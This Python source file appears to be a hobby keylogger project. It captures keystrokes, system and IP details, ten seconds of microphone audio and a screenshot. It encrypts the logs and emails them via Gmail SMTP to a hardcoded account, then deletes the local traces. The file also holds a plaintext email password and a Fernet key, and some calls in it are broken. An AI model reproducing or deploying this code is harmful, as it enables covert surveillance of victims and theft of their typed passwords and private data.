### LIBRARIES ###

# email libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# to collect information
import socket 
import platform
# from tkinter import Wb

# import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os 

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get 

from multiprocessing import Process, freeze_support
from PIL import ImageGrab



# global variables
email_address = "keyloggerblablaproject@gmail.com"
password = "FREAKINGblabla69"
toaddr = "keyloggerblablaproject@gmail.com"

file_path = "/Users/williamyang/Desktop/smthg_awesome/"
keys_information = "key_log4.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log4.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

key = "-MfQZkl4emBnkTZlRh_lo3Dik-1WBxI_dgXRzJzc6Ps="

microphone_time = 10

# every interation lasts for 15 seconds
time_iteration = 15 
num_iterations_end = 3

def computer_information():
    with open(file_path + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Public IP address could not be obtained\n")
        
        # write processor information
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

# def copy_clipboard():
#     with open(file_path + clipboard_information, "a") as f:
#         try:
#             win32clipboard.OpenClipboard()
#             clipboard_data = win32clipboard.GetClipboardData()
#             win32clipboard.CloseClipboard()
            
#             f.write("Clipboard Data: \n" + clipboard_data)

#         except:
#             f.write("Clipboard could nit be be copied")

# copy_clipboard()

def microphone():
    
    # sampling frequency
    fs = 44100
    
    # duration of recording
    seconds = microphone_time
    
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    
    write(file_path + audio_information, fs, myrecording)
    
microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_information)
    
screenshot()

def send_email(filename, attachment, toaddr):

    fromaddr = email_address
    
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr 
    msg['Subject'] = "Log File"

    # create the body of the email
    body = "mail_body"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    
    # read the attachment as binary
    attachment = open(attachment, 'rb')

    # create the mime base
    p = MIMEBase('application', 'octet-stream')
    
    # encode the message
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    
    # create email header
    p.add_header('Content-Disposition', "attachment: filename= %s" % filename)
    msg.attach(p)
    
    # create SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    
    # convert multipart message into a string
    text = msg.as_string()
    
    # send message
    s.sendmail(fromaddr, toaddr, text)
    
    # quit session
    s.quit()
    
send_email(keys_information, file_path + keys_information, toaddr)

num_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while num_iterations < num_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        
        keys.append(key)
        count += 1
        currentTime = time.time()
        
        # restart count and keys list 
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + keys_information, "a") as f:
            for key in keys:
                
                # replace each single quote with nothing
                k = str(key).replace("'", "")
                
                # every time a space bar is pressed
                # a new line is pressed
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
                    
    def on_release(key): 
        
        # if esc is pressed, it exits keylogger
        if key == Key.esc:
            return False
        if currentTime < stoppingTime:
            return False
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
    if currentTime > stoppingTime:
        
        # clean off the key log file for the next execution
        with open(file_path + keys_information, "w") as f:
            f.write(" ")
        print("CLEAN OFF FILE")
        
        send_email()
        
        num_iterations += 1
        
        # update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
         
        
files_to_encrypt = [file_path + system_information, file_path + clipboard_information, file_path + keys_information]
encrypted_file_names = [file_path + system_information_e, file_path + clipboard_information_e, file_path + keys_information_e]

count = 0

for e_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
        
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
        
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1
    
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_path + file)
# time.sleep(60)
